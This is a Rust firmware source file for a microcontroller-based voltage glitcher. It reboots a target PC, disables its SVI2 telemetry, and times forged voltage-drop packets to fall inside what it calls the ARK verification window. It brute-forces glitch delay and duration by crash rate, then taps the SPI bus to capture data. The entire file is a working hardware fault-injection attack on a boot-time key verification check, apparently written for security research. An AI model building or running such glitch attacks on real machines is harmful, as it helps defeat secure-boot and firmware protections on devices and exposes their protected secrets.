use defmt::{info, warn};
use embassy_rp::Peri;
use embassy_rp::gpio::{Flex, Input, Output, Pull};
use embassy_rp::peripherals::{DMA_CH2, DMA_CH3, PIN_2, PIN_4, PIN_5, SPI0};
use embassy_rp::pio::Instance;
use embassy_time::{Delay, Duration, Timer, with_timeout};
use embedded_hal::delay::DelayNs;
use glitcher_rpc::{Controller2HostMessage, Parameters, SPI_TAP_MAX_BYTES};

use crate::i2c_pio::I2cPio;
use crate::spi_tap::{self, SpiTapResult};
use crate::svi2;

const ATTACK_SPI_TAP_TIMEOUT_S: u32 = 5;

pub async fn determine_cs_count<PIO: Instance, const SM: usize>(
    target_reboot_pin: &mut Flex<'_>,
    power_button_pin: &mut Flex<'_>,
    svd_in: &mut Input<'_>,
    svc_in: &mut Input<'_>,
    logic_analyzer_trigger: &mut Output<'_>,
    i2c: &mut I2cPio<'_, PIO, SM>,
    spi_slave_cs_pin: &mut Peri<'static, PIN_5>,
) -> Result<u32, Controller2HostMessage> {
    // Check that target is running
    if !check_and_start_target(svc_in, power_button_pin).await {
        return Err(Controller2HostMessage::DetermineParamFailedNotRunning);
    }
    // Reboot
    reboot_target_with_trigger(target_reboot_pin, logic_analyzer_trigger).await;

    match wait_boot_and_disable_telemetry(30, svd_in, svc_in, logic_analyzer_trigger, i2c).await {
        Controller2HostMessage::TelemetryDisabled => (),
        msg => return Err(msg),
    }

    let mut cs_input = Flex::new(spi_slave_cs_pin.reborrow());
    cs_input.set_pull(Pull::None);
    cs_input.set_as_input();

    if !busy_wait_cs_falling_edges(&mut cs_input, 1) {
        warn!("CS count for actual determination failed");
        return Err(Controller2HostMessage::GlitchAttackFailed);
    }

    let mut cs_count = 0;

    // find a longer period of CS high in a critical section (because of timings)
    if !critical_section::with(|_| {
        for _ in 0..50 {
            cs_count += 1;
            if (0..10_000).all(|_| cs_input.is_low()) {
                info!("No CS high period found");
                return false;
            }
            let cs_high_time = embassy_time::Instant::now();
            if (0..10_000).all(|_| cs_input.is_high()) {
                info!("CS high period not ending");
                return false;
            }
            let cs_high_duration = embassy_time::Instant::now()
                .duration_since(cs_high_time)
                .as_nanos() as u32;
            if cs_high_duration > 10_000 {
                info!("CS high period found after {} iterations", cs_count);
                return true;
            }
        }
        false
    }) {
        return Err(Controller2HostMessage::DetermineParamFailed);
    }

    Ok(cs_count)
}

pub async fn determine_wait_duration<PIO: Instance, const SM: usize>(
    target_reboot_pin: &mut Flex<'_>,
    power_button_pin: &mut Flex<'_>,
    svd_in: &mut Input<'_>,
    svc_in: &mut Input<'_>,
    logic_analyzer_trigger: &mut Output<'_>,
    i2c: &mut I2cPio<'_, PIO, SM>,
    spi_slave_cs_pin: &mut Peri<'static, PIN_5>,
    spi0: &mut Peri<'static, SPI0>,
    spi_slave_clk: &mut Peri<'static, PIN_2>,
    spi_slave_miso: &mut Peri<'static, PIN_4>,
    spi_tx_dma: &mut Peri<'static, DMA_CH2>,
    spi_rx_dma: &mut Peri<'static, DMA_CH3>,
    vid: u8,
) -> Controller2HostMessage {
    let cs_count = match determine_cs_count(
        target_reboot_pin,
        power_button_pin,
        svd_in,
        svc_in,
        logic_analyzer_trigger,
        i2c,
        spi_slave_cs_pin,
    )
    .await
    {
        Ok(cs_count) => cs_count,
        Err(err) => {
            return err;
        }
    };

    let duration_range = 200_000..500_000;
    let mut duration_step = 20_000;
    let mut duration = duration_range.start;

    for num_cs_skipped in 1..cs_count {
        let num_cs_used = cs_count - num_cs_skipped;

        let mut cs_input = Flex::new(spi_slave_cs_pin.reborrow());
        cs_input.set_pull(Pull::None);
        cs_input.set_as_input();

        // first check that the target is booting normally:
        // Check that target is running
        if !check_and_start_target(svc_in, power_button_pin).await {
            return Controller2HostMessage::GlitchAttackFailedTargetNotRunning;
        }
        // Reboot
        reboot_target_with_trigger(target_reboot_pin, logic_analyzer_trigger).await;
        // Correctly disable telemetry
        match wait_boot_and_disable_telemetry(30, svd_in, svc_in, logic_analyzer_trigger, i2c).await
        {
            Controller2HostMessage::TelemetryDisabled => (),
            msg => return msg,
        }

        if !busy_wait_cs_falling_edges(&mut cs_input, num_cs_used) {
            return Controller2HostMessage::GlitchAttackFailed;
        }
        let start_time = embassy_time::Instant::now();

        // find a longer period of CS high in a critical section (because of timings)
        if !critical_section::with(|_| {
            for cs_count_after in 0..50 {
                if (0..10_000).all(|_| cs_input.is_low()) {
                    info!("No CS high period found");
                    return false;
                }
                let cs_high_time = embassy_time::Instant::now();
                if (0..10_000).all(|_| cs_input.is_high()) {
                    info!("CS high period not ending");
                    return false;
                }
                let cs_high_duration = embassy_time::Instant::now()
                    .duration_since(cs_high_time)
                    .as_nanos() as u32;
                if cs_high_duration > 10_000 {
                    if cs_count_after != num_cs_skipped {
                        warn!(
                            "CS high period found after {} iterations but skipped {} times",
                            cs_count_after, num_cs_skipped
                        );
                        return false;
                    }
                    return true;
                }
            }
            false
        }) {
            return Controller2HostMessage::GlitchAttackFailed;
        }

        let cs_high_time = embassy_time::Instant::now();

        if (0..10_000).all(|_| cs_input.is_high()) {
            return Controller2HostMessage::GlitchAttackFailed;
        }

        let cs_low_time = embassy_time::Instant::now();

        // ARK verification window is this [min, max] delay
        let wait_duration_min_ns = cs_high_time.duration_since(start_time).as_nanos() as u32;
        let wait_duration_max_ns = cs_low_time.duration_since(start_time).as_nanos() as u32;
        info!(
            "wait_duration_min_ns: {}, wait_duration_max_ns: {}",
            wait_duration_min_ns, wait_duration_max_ns
        );

        drop(cs_input);

        // now determine the wait duration.
        // Set delay in the at 2/3 of the window and then brute force search for the correct delay
        // by gradually increasing the delay until the target crashes 50% of the time
        // TODO: set min max duratino as parameters instead of [100_000..500_000]
        let wait_duration_ns =
            wait_duration_min_ns + ((wait_duration_max_ns - wait_duration_min_ns) / 3) * 2;
        info!("wait_duration_ns: {}", wait_duration_ns);

        while duration <= duration_range.end {
            if duration >= wait_duration_ns {
                info!(
                    "Need more delay -> using less CS count: {}",
                    num_cs_used - 1
                );
                break;
            }
            // for each duration, try 100 times and see how often the target crashes
            let mut crash_count = 0;
            for _ in 0..100 {
                let mut capture = [0u8; SPI_TAP_MAX_BYTES];
                match single_attack(
                    target_reboot_pin,
                    power_button_pin,
                    svd_in,
                    svc_in,
                    logic_analyzer_trigger,
                    i2c,
                    spi_slave_cs_pin,
                    spi0,
                    spi_slave_clk,
                    spi_slave_miso,
                    spi_tx_dma,
                    spi_rx_dma,
                    &mut capture,
                    0,
                    cs_count,
                    vid,
                    wait_duration_ns,
                    duration,
                )
                .await
                {
                    Ok(_) => {}
                    Err(Controller2HostMessage::SpiTapError(_)) => {}
                    Err(Controller2HostMessage::GlitchAttackFailed) => crash_count += 1,
                    Err(error) => {
                        warn!("Unexpected error: {:?}", error);
                        return error;
                    }
                }
            }
            info!("Crashed {} times, duration: {} ns", crash_count, duration);
            // if we've crashed about 50% of the time (more than 45%), we found a reliable wait duration
            if crash_count > 45 {
                return Controller2HostMessage::DetermineParamSucceeded(Parameters {
                    delay: (wait_duration_min_ns, wait_duration_max_ns),
                    duration: (duration - duration_step, duration + duration_step),
                    chip_select_count: num_cs_used,
                });
            } else if crash_count > 30 {
                duration_step = 1_000;
            } else if crash_count > 20 {
                duration_step = 2_000;
            } else if crash_count > 10 {
                duration_step = 5_000;
            } else if crash_count > 1 {
                duration_step = 10_000;
            }
            duration += duration_step;
        }
    }

    Controller2HostMessage::DetermineParamFailed
}

pub async fn single_attack<PIO: Instance, const SM: usize>(
    target_reboot_pin: &mut Flex<'_>,
    power_button_pin: &mut Flex<'_>,
    svd_in: &mut Input<'_>,
    svc_in: &mut Input<'_>,
    logic_analyzer_trigger: &mut Output<'_>,
    i2c: &mut I2cPio<'_, PIO, SM>,
    spi_slave_cs_pin: &mut Peri<'static, PIN_5>,
    spi0: &mut Peri<'static, SPI0>,
    spi_slave_clk: &mut Peri<'static, PIN_2>,
    spi_slave_miso: &mut Peri<'static, PIN_4>,
    spi_tx_dma: &mut Peri<'static, DMA_CH2>,
    spi_rx_dma: &mut Peri<'static, DMA_CH3>,
    capture: &mut [u8; SPI_TAP_MAX_BYTES],
    spi_byte_count: u32,
    chip_select_count: u32,
    vid: u8,
    wait_duration_ns: u32,
    dip_duration_ns: u32,
) -> Result<SpiTapResult, Controller2HostMessage> {
    if wait_duration_ns < dip_duration_ns {
        return Err(Controller2HostMessage::UnknownCommand);
    }

    // Check that target is running
    if !check_and_start_target(svc_in, power_button_pin).await {
        return Err(Controller2HostMessage::GlitchAttackFailedTargetNotRunning);
    }
    // Reboot
    reboot_target_with_trigger(target_reboot_pin, logic_analyzer_trigger).await;
    // Correctly disable telemetry
    match wait_boot_and_disable_telemetry(30, svd_in, svc_in, logic_analyzer_trigger, i2c).await {
        Controller2HostMessage::TelemetryDisabled => (),
        msg => return Err(msg),
    }
    // Wait for chip_select_count spi triggers (falling flanks)
    let mut cs_input = Flex::new(spi_slave_cs_pin.reborrow());
    cs_input.set_pull(Pull::None);
    cs_input.set_as_input();

    // Indicate chip select count by pulling trigger high
    logic_analyzer_trigger.set_high();
    if !busy_wait_cs_falling_edges(&mut cs_input, chip_select_count) {
        return Err(Controller2HostMessage::GlitchAttackFailed);
    }
    logic_analyzer_trigger.set_low();

    // Wait for specified delay (wait_duration_ns)
    Delay.delay_ns(wait_duration_ns - dip_duration_ns);

    // Show when actually glitching
    {
        logic_analyzer_trigger.set_high();
        // Inject SVI2 packet (with custom value vid)
        svi2::set_vid(i2c, Some(vid));

        // Wait for specified delay (dip_duration_ns)
        Delay.delay_ns(dip_duration_ns);

        // Inject SVI2 packet (with default value)
        svi2::set_vid(i2c, None);
        logic_analyzer_trigger.set_low();
    }

    // Recognize if the machine continues running by checking for another CS edge.
    if with_timeout(Duration::from_micros(500), cs_input.wait_for_falling_edge())
        .await
        .is_err()
    {
        return Err(Controller2HostMessage::GlitchAttackFailed);
    }

    // Drop cs
    drop(cs_input);

    // SPI Tap for the specified amount of bytes
    spi_tap::tap_spi(
        spi0,
        spi_slave_clk,
        spi_slave_miso,
        spi_slave_cs_pin,
        spi_tx_dma,
        spi_rx_dma,
        capture,
        spi_byte_count,
        ATTACK_SPI_TAP_TIMEOUT_S,
    )
    .await
    .map_err(Controller2HostMessage::SpiTapError)
}

pub async fn wait_boot_and_disable_telemetry<PIO: Instance, const SM: usize>(
    timeout_ms: u64,
    svd_in: &mut Input<'_>,
    svc_in: &mut Input<'_>,
    logic_analyzer_trigger: &mut Output<'_>,
    i2c: &mut I2cPio<'_, PIO, SM>,
) -> Controller2HostMessage {
    match with_timeout(Duration::from_millis(timeout_ms), svd_in.wait_for_high()).await {
        Ok(()) => {
            critical_section::with(|_| {
                // Blocking wait
                Delay.delay_us(50);

                logic_analyzer_trigger.set_high();

                if !(0..20_000).any(|_| svc_in.is_low()) {
                    logic_analyzer_trigger.set_low();
                    return false;
                }

                logic_analyzer_trigger.set_low();

                // Optional cycle-level adjustment goes here.
                Delay.delay_us(5);

                logic_analyzer_trigger.set_high();
                svi2::disable_telemetry(i2c);
                logic_analyzer_trigger.set_low();

                true
            })
            .then_some(Controller2HostMessage::TelemetryDisabled)
            .unwrap_or(Controller2HostMessage::TelemetryTimedOut)
        }
        Err(_) => Controller2HostMessage::TelemetryTimedOut,
    }
}

/// Reboot the target and pulse the logic-analyzer trigger after the reboot.
pub async fn reboot_target_with_trigger(
    target_reboot_pin: &mut Flex<'_>,
    logic_analyzer_trigger: &mut Output<'_>,
) {
    reboot_target(target_reboot_pin).await;
    logic_analyzer_trigger.set_high();
    Timer::after_millis(5).await;
    logic_analyzer_trigger.set_low();
}

/// Pulse the target reset line low, leaving it otherwise high-impedance.
pub async fn reboot_target(target_reboot_pin: &mut Flex<'_>) {
    pulse_low(target_reboot_pin, 1).await;
}

/// Hold the target power button low, leaving the line otherwise high-impedance.
pub async fn press_power_button(power_button_pin: &mut Flex<'_>, duration_ms: u32) {
    pulse_low(power_button_pin, duration_ms).await;
}

async fn pulse_low(pin: &mut Flex<'_>, duration_ms: u32) {
    pin.set_low();
    pin.set_as_output();
    Timer::after_millis(u64::from(duration_ms)).await;
    pin.set_as_input();
}

#[inline(always)]
pub fn busy_wait_cs_falling_edges(cs_input: &mut Flex<'_>, chip_select_count: u32) -> bool {
    let mut was_high = cs_input.is_high();
    for _ in 0..chip_select_count {
        // Polling avoids the interrupt and executor latency of an async GPIO wait.
        if !(0..200_000).any(|_| {
            let is_high = cs_input.is_high();
            let falling_edge = was_high && !is_high;
            was_high = is_high;
            falling_edge
        }) {
            warn!("Failed to count CS falling edge!");
            return false;
        }
    }
    true
}

#[inline(always)]
pub async fn check_and_start_target(
    svc_in: &mut Input<'_>,
    power_button_pin: &mut Flex<'_>,
) -> bool {
    if (0..1_000).all(|_| svc_in.is_low()) {
        warn!("SVC low, powering on");
        press_power_button(power_button_pin, 100).await;
        Timer::after_millis(500).await;
        if (0..1_000).all(|_| svc_in.is_low()) {
            return false;
        }
    }
    true
}
